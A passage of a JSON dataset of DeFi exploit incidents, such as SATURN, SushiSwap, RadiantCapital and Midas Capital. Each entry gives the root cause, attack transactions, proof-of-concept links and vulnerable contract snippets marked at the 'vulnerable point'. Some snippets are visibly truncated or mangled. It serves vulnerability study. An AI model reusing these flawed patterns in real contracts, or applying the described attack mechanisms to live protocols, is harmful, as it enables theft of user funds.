amount;\n            valueInUSD = amount.mul(priceOfBNB()).div(1e18);\n        }\n        else if (keccak256(abi.encodePacked(IPancakePair(asset).symbol())) == keccak256(\"Cake-LP\")) {\n            if (IPancakePair(asset).totalSupply() == 0) return (0, 0);\n\n            if (IPancakePair(asset).token0() == WBNB || IPancakePair(asset).token1() == WBNB) {\n                valueInBNB = amount.mul(IBEP20(WBNB).balanceOf(address(asset))).mul(2).div(IPancakePair(asset).totalSupply()); //vulnerable point, incorrect calculation\n                valueInUSD = valueInBNB.mul(priceOfBNB()).div(1e18);\n"
    },
    {
        "type": "Price Manipulation",
        "date": "20240507",
        "title": "SATURN",
        "root_cause": "The vulnerability in this case occurred due to the synchronization (`sync`) operation being performed on the PancakeSwap (WBNB-SATURN) pool before processing the incoming token transfers. This led to distorted reserves in the PancakeSwap (WBNB-SATURN) pool and a significant increase in the value of SATURN tokens.",
        "attack_tx": [
            "https://bscscan.com/tx/0x948132f219c0a1adbffbee5d9dc63bec676dd69341a6eca23790632cb9475312",
            "https://app.blocksec.com/explorer/tx/bsc/0x948132f219c0a1adbffbee5d9dc63bec676dd69341a6eca23790632cb9475312"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/SATURN_exp.sol",
        "vulnerable_code": "https://bscscan.com/address/0x9BDF251435cBC6774c7796632e9C80B233055b93#code",
        "analysis": "https://lunaray.medium.com/saturn-hack-analysis-187eea27725b",
        "vulnerable_code_snippet": "uint256 _txFee;\nif (tot == uniswapV2Pair) {\n    require(amount <= everyTimeSellLimitAmount, \"Exchange Overflow\"); // sell\n    unchecked {\n        _txFee = amount * sellFee / commonDiv;\n        amount -= _txFee;\n    }\n} else if (from == uniswapV2Pair) {\n    require(amount <= everyTimeBuyLimitAmount, \"Exchange Overflow\"); // buy\n    unchecked {\n        _txFee = amount * buyFee / commonDiv;\n        amount -= _txFee;\n    }\n} ... function _transfer(address from, address to, uint256 amount) internal virtual override {\n    // Other logic here\n} else if (from == uniswapV2Pair) {\n    require(amount <= everyTimeBuyLimitAmount, \"Exchange Overflow\"); // buy\n    unchecked {\n        _txFee = amount * buyFee / commonDiv;\n        amount -= _txFee;\n    }\n\n    // buy to lock time\n    _lockUserTxToken(to, amount);\n\n    if (_txFee > 0) {\n        super._transfer(from, tokenReceiver, _txFee); // vulnerable point\n    }\n\n    if (to == uniswapV2Pair) {\n        // record disabled block overflow number\n        _processBlockOverflow();\n        \n        uint256 lpb = balanceOf(uniswapV2Pair);\n        if (lpb >= _overFlowBurnAmount()) {\n            uint256 amountToBurn = amount.mul(burnRate).div(commonDiv);\n            uint256 _burnAmount = lpb > amountToBurn ? amountToBurn : lpb; // times burn\n            uint256 _blockAmount = _blockRemainingBurnAmount(_burnAmount);\n            if (_blockAmount > 0 && isSwapping && automatedMarketMakerPairs[to]) {\n                autoLiquidityPairTokens(_blockAmount); // in here\n            }\n        }\n    }\n\n    super._transfer(from, to, amount); // vulnerable point\n} ... function lockTheSwap(uint256 amountToBurn) private {\n    // pull tokens from pancakePair liquidity and move to dead address permanently\n    recordBurn(uniswapV2Pair, amountToBurn);\n    // sync price since this is not in a swap transaction!\n    IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);\n    pair.sync();\n    emit AutoNukeLP();\n}"
    },
    {
        "type": "Precision",
        "date": "20240112",
        "title": "WiseLending",
        "root_cause": "Wise Lending's system was exploited due to a rounding issue in the _calculateShares function and manipulation of donation safeguards. The attacker bypassed donation limits and exploited rounding errors through strategic deposits and withdrawals, gaining a disproportionately large share of donations.",
        "attack_tx": "https://etherscan.io/tx/0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/WiseLending02_exp.sol",
        "analysis": "https://twitter.com/EXVULSEC/status/1746138811862577515",
        "vulnerable_code_snippet": "function _calculateShares(\n        uint256 _product,\n        uint256 _pseudo,\n        bool _maxSharePrice\n    )\n        private\n        pure\n        returns (uint256)\n    {\n        return _maxSharePrice == true\n            ? _product % _pseudo == 0\n                ? _product / _pseudo\n                : _product / _pseudo + 1\n            : _product / _pseudo;\n    }"
    },
    {
        "type": "Access Control, Dex/AMM, Insufficient validation",
        "date": "20230409",
        "title": "SushiSwap",
        "lost": "$3.3M",
        "root_cause": "Sushi RouteProcessor2 does not check user input `route` carefully. The root cause is that ProcessRoute does not perform any checks on the user-provided route parameter, allowing the attacker to exploit this issue by constructing a malicious route parameter that causes the contract to read a Pool created by the attacker.",
        "attack_tx": [
            "https://www.notion.so",
            "https://library.dedaub.com/ethereum/tx/0x04b166e7b4ab5105a8e9c85f08f6346de1c66368687215b0e0b58d6e5002bc32"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Sushi_Router_exp.sol",
        "analysis": [
            "https://twitter.com/peckshield/status/1644907207530774530",
            "https://twitter.com/SlowMist_Team/status/1644936375924584449",
            "https://twitter.com/AnciliaInc/status/1644925421006520320"
        ],
        "vulnerable_code_snippet": "/// @notice Processes the route generated off-chain. Has a lock\n  /// @param tokenIn Address of the input token\n  /// @param amountIn Amount of the input token\n  /// @param tokenOut Address of the output token\n  /// @param amountOutMin Minimum amount of the output token\n  /// @return amountOut Actual amount of the output token\n  function processRoute(\n    address tokenIn,\n    uint256 amountIn,\n    address tokenOut,\n    uint256 amountOutMin,\n    address to,\n    bytes memory route //vulnerable point\n  ) external payable lock returns (uint256 amountOut) {\n    return processRouteInternal(tokenIn, amountIn, tokenOut, amountOutMin, to, route);\n  }"
    },
    {
        "type": "Arbitrary Call",
        "date": "20240531",
        "title": "MixedSwapRouter",
        "root_cause": "Arbitrary Call, controllable data.pool.",
        "attack_tx": [
            "https://arbiscan.io/tx/0xf57f041cb6d8a10e11edab50b84e49b59ff834c7d114d1e049cedd654c36194d",
            "https://app.blocksec.com/explorer/tx/arbitrum/0xf57f041cb6d8a10e11edab50b84e49b59ff834c7d114d1e049cedd654c36194d"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/MixedSwapRouter_exp.sol",
        "analysis": "![Screenshot 2024-07-02 at 2.15.44\u202fPM.png](Arbitrary%20Call%202ed71b9e124b497c9c027d982bb83bbf/Screenshot_2024-07-02_at_2.15.44_PM.png)",
        "vulnerable_code_snippet": "//AlgebraSwap v3 callback\nfunction algebraSwapCallback(\n    int256 amount0,\n    int256 amount1,\n    bytes calldata data <-- vulnerable point\n) public {\n    _processV3Callback(amount0, amount1, data);\n}\n    \nfunction _processV3Callback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata _data\n) internal {\n    require(_reentrancyGuardEntered(), \"FBD\");\n    require(amount0Delta > 0 || amount1Delta > 0, \"Invalid amount\"); // swaps entirely within 0-liquidity regions are not supported\n    SwapCallbackData memory data = abi.decode(_data, (SwapCallbackData));\n    require(msg.sender == data.pool, \"Invalid caller\");\n    (address tokenIn, address tokenOut, ) = data.path.decodeFirstPool();\n    _validatePoolTokens(\n        tokenIn,\n        tokenOut,\n        data.pool\n    );\n\n    (bool isExactInput, uint256 amountToPay) =\n        amount0Delta > 0\n            ? (tokenIn < tokenOut, uint256(amount0Delta))\n            : (tokenOut < tokenIn, uint256(amount1Delta));\n    if (isExactInput) {\n        pay(tokenIn, data.payer, msg.sender, amountToPay);\n    } else {\n        // either initiate the next swap or pay\n        if (data.path.hasMultiplePools()) {\n            data.path = data.path.skipToken();\n            _exactOutputInternalV3(\n                amountToPay,\n                msg.sender,\n                0,\n                data. <-- vulnerable point\n            );\n        } else {\n            tokenIn = tokenOut; // swap in/out because exact output swaps are reversed\n            pay(tokenIn, data.payer, msg.sender, amountToPay);\n        }\n    }\n}\n\n/// @dev Performs a single exact output swap\nfunction _exactOutputInternalV3(\n    uint256 amountOut,\n    address recipient,\n    uint160 sqrtPriceLimitX96,\n    SwapCallbackData memory data.  \n) private returns (uint256 amountIn) {\n    require(data.pool != address(0), \"InvalidPool\");\n    // allow swapping to the router address with address 0\n    if (recipient == address(0)) recipient = address(this);\n\n    (address tokenA, address tokenB, ) = data.path.decodeFirstPool();\n    _validatePoolTokens(\n        tokenA,\n        tokenB,\n        data.pool.  \n    );\n    bool zeroForOne = tokenA < tokenB;\n\n    (int256 amount0Delta, int256 amount1Delta) = IUniswap(data.pool).swap(    <-- data.pool vulnerable point\n            recipient,\n            zeroForOne,\n            -amountOut.toInt256(),\n            sqrtPriceLimitX96 == 0\n                ? (zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)\n                : sqrtPriceLimitX96,\n            abi.encode(data)\n        );\n\n    uint256 amountOutReceived;\n    (amountIn, amountOutReceived) = zeroForOne\n        ? (uint256(amount0Delta), uint256(-amount1Delta))\n        : (uint256(amount1Delta), uint256(-amount0Delta));\n    // it's technically possible to not receive the full output amount,\n    // so if no price limit has been specified, require this possibility away\n    if (sqrtPriceLimitX96 == 0) require(amountOutReceived == amountOut);\n}"
    },
    {
        "type": "Exploit",
        "date": "20240102",
        "title": "RadiantCapital",
        "root_cause": "The attacker exploited a vulnerability in the project's token quantity calculation, leveraging precision expansion and rounding. Through precise control over these factors, the attacker widened profit margins and systematically drained all USDC from the pool by repeatedly executing deposit() and withdraw() operations.",
        "lost": "4,5M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/RadiantCapital_exp.sol",
        "attack_tx": "https://arbiscan.io/tx/0x1ce7e9a9e3b6dd3293c9067221ac3260858ce119ecb7ca860eac28b2474c7c9b",
        "analysis": "https://twitter.com/beosinalert/status/1742389285926678784?s=61&t=PNVNUmeNmnbzLZBf7IEtjA",
        "vulnerable_code_snippet": "function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) public whenNotPaused {\n\tDataTypes.ReserveData storage reserve = _reserves[asset];\n\n\tValidationLogic.validateDeposit(reserve, amount);\n\n\taddress aToken = reserve.aTokenAddress;\n\n\treserve.updateState();\n\treserve.updateInterestRates(asset, aToken, amount, 0);\n\n\tIERC20(asset).safeTransferFrom(msg.sender, aToken, amount);\n\n\tif (IAToken(aToken).balanceOf(onBehalfOf) == 0) {\n\t\t_usersConfig[onBehalfOf].setUsingAsCollateral(reserve.id, true);\n\t\temit ReserveUsedAsCollateralEnabled(asset, onBehalfOf);\n\t}\n\n\t/// @custom:borrow-and-supply-caps\n\tValidationLogic.validateSupplyCap(reserve, amount);\n\n\tIAToken(aToken).mint(onBehalfOf, amount, reserve.liquidityIndex);\n\n\temit Deposit(asset, msg.sender, onBehalfOf, amount, referralCode);\n}\n...\nfunction withdraw(address asset, uint256 amount, address to) external whenNotPaused returns (uint256) {\n\tDataTypes.ReserveData storage reserve = _reserves[asset];\n\n\taddress aToken = reserve.aTokenAddress;\n\n\tuint256 userBalance = IAToken(aToken).balanceOf(msg.sender);\n\n\tuint256 amountToWithdraw = amount;\n\n\tif (amount == type(uint256).max) {\n\t\tamountToWithdraw = userBalance;\n\t}\n\n\tValidationLogic.validateWithdraw(\n\t\tasset,\n\t\tamountToWithdraw,\n\t\tuserBalance,\n\t\t_reserves,\n\t\t_usersConfig[msg.sender],\n\t\t_reservesList,\n\t\t_reservesCount,\n\t\t_addressesProvider.getPriceOracle()\n\t);\n\n\treserve.updateState();\n\n\treserve.updateInterestRates(asset, aToken, 0, amountToWithdraw);\n\n\tif (amountToWithdraw == userBalance) {\n\t\t_usersConfig[msg.sender].setUsingAsCollateral(reserve.id, false);\n\t\temit ReserveUsedAsCollateralDisabled(asset, msg.sender);\n\t}\n\n\tIAToken(aToken).burn(msg.sender, to, amountToWithdraw, reserve.liquidityIndex);\n\n\temit Withdraw(asset, msg.sender, to, amountToWithdraw);\n\n\treturn amountToWithdraw;\n}"
    },
    {
        "type": "ERC20, skim",
        "date": "20230110",
        "lost": "$224K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BRA.exp.sol",
        "title": "BRA",
        "root_cause": "The root cause is due to a logic flaw of the BRA contract, which doubles reward the tax fee to the pancake pair without invoking the sync() function after transferring.",
        "attack_tx": [
            "0x6759db55a4edec4f6bedb5691fc42cf024be3a1a534ddcc7edd471ef205d4047 (profit 675 WBNB)",
            "0x4e5b2efa90c62f2b62925ebd7c10c953dc73c710ef06695eac3f36fe0f6b9348 (profit 144 WBNB)"
        ],
        "analysis": "https://twitter.com/BlockSecTeam/status/1612701106982862849",
        "vulnerable_code_snippet": "function _transfer(address sender, address recipient, uint amount) internal {\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\n\n        bool recipientAllow = ConfigBRA(BRA).isAllow(recipient);\n        bool senderAllowSell = ConfigBRA(BRA).isAllowSell(sender);\n\n        uint BuyPer = ConfigBRA(BRA).BuyPer();\n        uint SellPer = ConfigBRA(BRA).SellPer();\n\n        address BuyTaxTo_ = address(0);\n        address SellTaxTo_ = address(0);\n\n        _balances[sender] = _balances[sender].sub(amount, \"BEP20: transfer amount exceeds balance\");\n\n        uint256 finalAmount = amount;\n        uint256 taxAmount = 0;\n  \n        if(sender == uniswapV2Pair && !recipientAllow){\n            taxAmount = amount.div(10000).mul(BuyPer);\n            BuyTaxTo_ = ConfigBRA(BRA).BuyTaxTo();\n        }\n\n        if(recipient == uniswapV2Pair && !senderAllowSell){\n            taxAmount = amount.div(10000).mul(SellPer);\n            SellTaxTo_ = ConfigBRA(BRA).SellTaxTo();\n        }\n\n        finalAmount = finalAmount - taxAmount;\n\n        if(BuyTaxTo_ != address(0)){\n            _balances[BuyTaxTo_] = _balances[BuyTaxTo_].add(taxAmount);\n            emit Transfer(sender, BuyTaxTo_, taxAmount);\n        }\n\n        if(SellTaxTo_ != address(0)){\n            _balances[SellTaxTo_] = _balances[SellTaxTo_].add(taxAmount);\n            emit Transfer(sender, SellTaxTo_, taxAmount);\n        }\n        \n        _balances[recipient] = _balances[recipient].add(finalAmount);\n        \n        if (recipient == address(0)) {\n            totalBurn = totalBurn.add(amount);\n            _totalSupply = _totalSupply.sub(amount);\n            emit Burn(sender, address(0), amount);\n        }\n        emit Transfer(sender, recipient, finalAmount);\n    }"
    },
    {
        "type": "Access Control",
        "date": "20240416",
        "title": "SATX",
        "root_cause": "unverified external call, improper parameter check",
        "attack_tx": "https://bscscan.com/tx/0x7e02ee7242a672fb84458d12198fae4122d7029ba64f3673e7800d811a8de93f",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SATX_exp.sol",
        "vulnerable_code": "https://bscscan.com/address/0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508#code",
        "analysis": "https://lunaray.medium.com/satx-token-hack-analysis-363a3438bcd1",
        "lost": "50 BNB"
    },
    {
        "name": "Midas Capital Exploit",
        "description": "A reentrancy exploit targeting Midas Capital's contract.",
        "type":"Reentrancy, Lending, Oracle",
        "root_cause": "Blocksec, It is due to an unexcepted external call before updating critical variables->reentrancy & miscalculation of the token prices. The key points to make profits are: 1) the calculation of a position's collateral depends on self.D and totalSupply; 2) self.D is updated after an unexcepted callback, so the four borrows in step 5 to use an outdated self.D.",
        "vulnerability": "Unsafe use of external calls, lack of reentrancy guard",
        "target_contract": "Midas Capital's cToken contract",
        "exploit_details": {
            "mechanism": "The attacker exploited a vulnerability in the `redeem` function of Midas Capital's cToken contract. The function called external contracts without proper reentrancy protection, allowing the attacker to execute malicious code repeatedly.",
            "steps": [
                "The attacker calls the `redeem` function with a large amount of tokens.",
                "During the execution of the `redeem` function, the contract calls an external contract controlled by the attacker.",
                "The external contract calls back into the `redeem` function again before the original call completes.",
                "This recursive call allows the attacker to drain funds from the contract repeatedly until it runs out of cash."
            ],
            "impact": "The attacker drained a significant amount of funds from Midas Capital's cToken contract."
        },
        "mitigation": [
            "Implement reentrancy guards in all external calls.",
            "Use safe math libraries to prevent overflow and underflow errors."
        ],
        "vulnerable_code_snippet": "function redeemFresh(\n    address redeemer,\n    uint256 redeemTokensIn,\n    uint256 redeemAmountIn\n) internal returns (uint256) {\n    require(redeemTokensIn == 0 || redeemAmountIn == 0, \"!redeemTokensInorOut!=0\");\n\n    RedeemLocalVars memory vars;\n\n    /* exchangeRate = invoke Exchange Rate Stored() */\n    (vars.mathErr, vars.exchangeRateMantissa) = exchangeRateStoredInternal();\n    if (vars.mathErr != MathError.NO_ERROR) {\n      return failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_EXCHANGE_RATE_READ_FAILED, uint256(vars.mathErr));\n    }\n\n    if (redeemAmountIn == type(uint256).max) {\n      redeemAmountIn = comptroller.getMaxRedeemOrBorrow(redeemer, address(this), false);\n    }\n\n    /* If redeemTokensIn > 0: */\n    if (redeemTokensIn > 0) {\n      /*\n       * We calculate the exchange rate and the amount of underlying to be redeemed:\n       *  redeemTokens = redeemTokensIn\n       *  redeemAmount = redeemTokensIn x exchangeRateCurrent\n       */\n      vars.redeemTokens = redeemTokensIn;\n\n      (vars.mathErr, vars.redeemAmount) = mulScalarTruncate(\n        Exp({ mantissa: vars.exchangeRateMantissa }),\n        redeemTokensIn\n      );\n      if (vars.mathErr != MathError.NO_ERROR) {\n        return\n          failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_EXCHANGE_TOKENS_CALCULATION_FAILED, uint256(vars.mathErr));\n      }\n    } else {\n      /*\n       * We get the current exchange rate and calculate the amount to be redeemed:\n       *  redeemTokens = redeemAmountIn / exchangeRate\n       *  redeemAmount = redeemAmountIn\n       */\n\n      (vars.mathErr, vars.redeemTokens) = divScalarByExpTruncate( //vulnerable point\n        redeemAmountIn,\n        Exp({ mantissa: vars.exchangeRateMantissa })\n      );\n      if (vars.mathErr != MathError.NO_ERROR) {\n        return\n          failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_EXCHANGE_AMOUNT_CALCULATION_FAILED, uint256(vars.mathErr));\n      }\n\n      vars.redeemAmount = redeemAmountIn;\n    }\n\n    /* Fail if redeem not allowed */\n    uint256 allowed = comptroller.redeemAllowed(address(this), redeemer, vars.redeemTokens);\n    if (allowed != 0) {\n      return failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.REDEEM_COMPTROLLER_REJECTION, allowed);\n    }\n\n    /* Verify market's block number equals current block number */\n    if (accrualBlockNumber != getBlockNumber()) {\n      return fail(Error.MARKET_NOT_FRESH, FailureInfo.REDEEM_FRESHNESS_CHECK);\n    }\n\n    /*\n     * We calculate the new total supply and redeemer balance, checking for underflow:\n     *  totalSupplyNew = totalSupply - redeemTokens\n     *  accountTokensNew = accountTokens[redeemer] - redeemTokens\n     */\n    (vars.mathErr, vars.totalSupplyNew) = subUInt(totalSupply, vars.redeemTokens);\n    if (vars.mathErr != MathError.NO_ERROR) {\n      return\n        failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_NEW_TOTAL_SUPPLY_CALCULATION_FAILED, uint256(vars.mathErr));\n    }\n\n    (vars.mathErr, vars.accountTokensNew) = subUInt(accountTokens[redeemer], vars.redeemTokens);\n    if (vars.mathErr != MathError.NO_ERROR) {\n      return\n        failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_NEW_ACCOUNT_BALANCE_CALCULATION_FAILED, uint256(vars.mathErr));\n    }\n\n    /* Fail gracefully if protocol has insufficient cash */\n    if (getCashPrior() < vars.redeemAmount) {\n      return fail(Error.TOKEN_INSUFFICIENT_CASH, FailureInfo.REDEEM_TRANSFER_OUT_NOT_POSSIBLE);\n    }\n\n    /////////////////////////\n    // EFFECTS & INTERACTIONS\n    // (No safe failures beyond this point)\n\n    /* We write previously calculated values into storage */\n    totalSupply = vars.totalSupplyNew;\n    accountTokens[redeemer] = vars.accountTokensNew;\n\n    /*\n     * We invoke doTransferOut for the redeemer and the redeemAmount.\n     *  Note: The cToken must handle variations between ERC-20 and ETH underlying.\n     *  On success, the cToken has redeemAmount less of cash.\n     *  doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.\n     */\n    doTransferOut(redeemer, vars.redeemAmount);\n\n    /* We emit a Transfer event, and a Redeem event */\n    emit Transfer(redeemer, address(this), vars.redeemTokens);\n    emit Redeem(redeemer, vars.redeemAmount, vars.redeemTokens);\n\n    /* We call the defense hook */\n    comptroller.redeemVerify(address(this), redeemer, vars.redeemAmount, vars.redeemTokens);\n\n    return uint256(Error.NO_ERROR);\n} ... def remove_liquidity(_amount: uint256, min_amounts: uint256[N_COINS],\n                      use_eth: bool = False, receiver: address = msg.sender):\n\n    This withdrawal method is very safe, does no complex math\n\n    lp_token: address = self.token\n\n    total_supply: uint256 = CurveToken(lp_token).totalSupply()\n\n    CurveToken(lp_token).burnFrom(msg.sender, _amount)\n\n    balances: uint256[N_COINS] = self.balances\n\n    amount: uint256 = _amount - 1  # Make rounding errors favoring other LPs a tiny bit\n\n    for i in range(N_COINS):\n        d_balance: uint256 = balances[i] * amount / total_supply\n        assert d_balance >= min_amounts[i]\n        self.balances[i] = balances[i] - d_balance\n        balances[i] = d_balance  # now it's the amounts going out\n        coin: address = self.coins[i]\n        if use_eth and coin == WETH20:\n            # callback\n            pass\n        else:\n            if coin == WETH20:\n                WETH(WETH20).deposit(value=d_balance)\n                response: Bytes[32] = raw_call(\n                    coin,\n                    _abi_encode(receiver, d_balance, method_id=method_id(\"transfer(address,uint256)\")),\n                    max_outsize=32,\n                )\n\n                if len(response) != 0:\n                    assert convert(response, bool)\n\n    D: uint256 = self.D\n\n    self.D = D - D * amount / total_supply  # (Delay) Update self.D\n\n    log RemoveLiquidity(msg.sender, balances, total_supply - _amount)"
    },
    {
        "type": "Miscalculation, Yield",
        "date": "20210603",
        "title": "PancakeHunny",
        "fixed": true,
        "root_cause": "Incorrect profit calculation via balanceOf",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210603-pancakehunny---incorrect-calculation",
        "analysis": "<Vulnerable code snippet analysis>",
        "vulnerable_code_snippet": "function getReward() override public nonReentrant updateReward(msg.sender) {\n        uint256 reward = rewards[msg.sender];\n        if (reward > 0) {\n            rewards[msg.sender] = 0;\n            rewardsToken.withdraw(reward);\n            uint cakeBalance = IBEP20(CAKE).balanceOf(address(this));\n\n            if (address(minter) != address(0) && minter.isMinter(address(this))) {\n                uint performanceFee = minter.performanceFee(cakeBalance);\n                minter.mintFor(CAKE, 0, performanceFee, msg.sender, depositedAt[msg.sender]); //check mintFor\n                cakeBalance = cakeBalance.sub(performanceFee);\n            }\n\n            IBEP20(CAKE).safeTransfer(msg.sender, cakeBalance);\n            emit RewardPaid(msg.sender, cakeBalance);\n        }\n    }\n\nfunction mintFor(address flip, uint _withdrawalFee, uint _performanceFee, address to, uint) override external onlyMinter {\n        uint feeSum = _performanceFee.add(_withdrawalFee);\n        IBEP20(flip).safeTransferFrom(msg.sender, address(this), feeSum);\n\n        uint hunnyBNBAmount = tokenToHunnyBNB(flip, IBEP20(flip).balanceOf(address(this))); //vulnerable point\n        address flipToken = hunnyBNBFlipToken();\n....\nfunction tokenToHunnyBNB(address token, uint amount) internal returns(uint flipAmount) {\n        if (token == cake) {\n            flipAmount = _cakeToHunnyBNBFlip(amount);\n        } else {\n            // flip\n            flipAmount = _flipToHunnyBNBFlip(token, amount);\n        }\n    }\nfunction _cakeToHunnyBNBFlip(uint amount) private returns(uint flipAmount) {\n        swapToken(cake, amount.div(2), _hunny);\n        swapToken(cake, amount.sub(amount.div(2)), _wbnb);\n\n        flipAmount = generateFlipToken();  \n    }\nfunction generateFlipToken() private returns(uint liquidity) {\n        uint amountADesired = IBEP20(_hunny).balanceOf(address(this));\n        uint amountBDesired = IBEP20(_wbnb).balanceOf(address(this));\n\n        IBEP20(_hunny).safeApprove(address(ROUTER), 0);\n        IBEP20(_hunny).safeApprove(address(ROUTER), amountADesired);\n        IBEP20(_wbnb).safeApprove(address(ROUTER), 0);\n        IBEP20(_wbnb).safeApprove(address(ROUTER), amountBDesired);\n\n        (,,liquidity) = ROUTER.addLiquidity(_hunny, _wbnb, amountADesired, amountBDesired, 0, 0, address(this), block.timestamp);"
    },
    {
        "type": "Reentrancy, Unchecked User Input",
        "date": "20230710",
        "title": "ArcadiaFi",
        "lost": "$400k",
        "root_cause": "In the function `vaultManagementAction()`, an attacker can first transfer all assets to a contract he controls, and then re-enter the function `liquidateVault()`to liquidate the vault. In this case, the global variable `\"isTrustedCreditorSet\"` will be set to `false` and the collateral check can be bypassed.",
        "attack_tx": [
            "https://optimistic.etherscan.io/tx/0xca7c1a0fde444e1a68a8c2b8ae3fb76ec384d1f7ae9a50d26f8bfdd37c7a0afe",
            "https://etherscan.io/tx/0xefc4ac015069fdf9946997be0459db44c0491221159220be782454c32ec2d651"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/ArcadiaFi_exp.sol",
        "analysis": "https://arcadiafinance.medium.com/post-mortem-72e9d24a79b0",
        "vulnerable_code_snippet": "function liquidateVault(uint256 openDebt)\n        external\n        returns (address originalOwner, address baseCurrency_, address trustedCreditor_)\n    {\n        require(msg.sender == liquidator, \"V_LV: Only Liquidator\");\n\n        //Cache trustedCreditor.\n        trustedCreditor_ = trustedCreditor;\n\n        //Close margin account.\n        isTrustedCreditorSet = false;\n        trustedCreditor = address(0);\n        liquidator = address(0);\n\n        //If getLiquidationValue (total value discounted with liquidation factor to account for slippage)\n        //is smaller than the Used Margin: sum of the liabilities of the Vault (openDebt)\n        //and the max gas cost to liquidate the vault (fixedLiquidationCost),\n        //then the Vault can be successfully liquidated.\n        //Liquidations are triggered by the trustedCreditor (via Liquidator), the openDebt is\n        //passed as input to avoid the need of another contract call back to trustedCreditor.\n        require(getLiquidationValue() < openDebt + fixedLiquidationCost, \"V_LV: liqValue above usedMargin\");\n\n        //Set fixedLiquidationCost to 0 since margin account is closed.\n        fixedLiquidationCost = 0;\n\n        //Transfer ownership of the ERC721 in Factory of the Vault to the Liquidator.\n        IFactory(IMainRegistry(registry).factory()).liquidate(msg.sender);\n\n        //Transfer ownership of the Vault itself to the Liquidator.\n        originalOwner = owner;\n        _transferOwnership(msg.sender);\n\n        emit TrustedMarginAccountChanged(address(0), address(0));\n\n        return (originalOwner, baseCurrency, trustedCreditor_);\n    }"
    }
]